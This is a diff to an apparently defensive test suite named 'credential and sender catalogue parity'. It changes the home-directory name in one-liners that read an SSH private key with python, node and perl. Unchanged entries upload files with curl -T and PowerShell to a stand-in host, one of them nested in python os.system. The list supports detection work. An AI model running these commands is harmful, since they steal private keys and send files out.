@@ -106,9 +106,9 @@ describe("credential and sender catalogue parity", () => {
     });
 
   it.each([
-    "python -c 'open(\"/home/operator/.ssh/id_rsa\").read()'",
-    "node -e \"require('fs').readFileSync('/home/operator/.ssh/id_rsa')\"",
-    "perl -e 'open(F,\"/home/operator/.ssh/id_rsa\")'",
+    "python -c 'open(\"/home/owner/.ssh/id_rsa\").read()'",
+    "node -e \"require('fs').readFileSync('/home/owner/.ssh/id_rsa')\"",
+    "perl -e 'open(F,\"/home/owner/.ssh/id_rsa\")'",
     "bash -c 'curl -T notes.txt http://e'",
     "pwsh -c 'iwr http://e -InFile f -Method Post'",
     "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'",
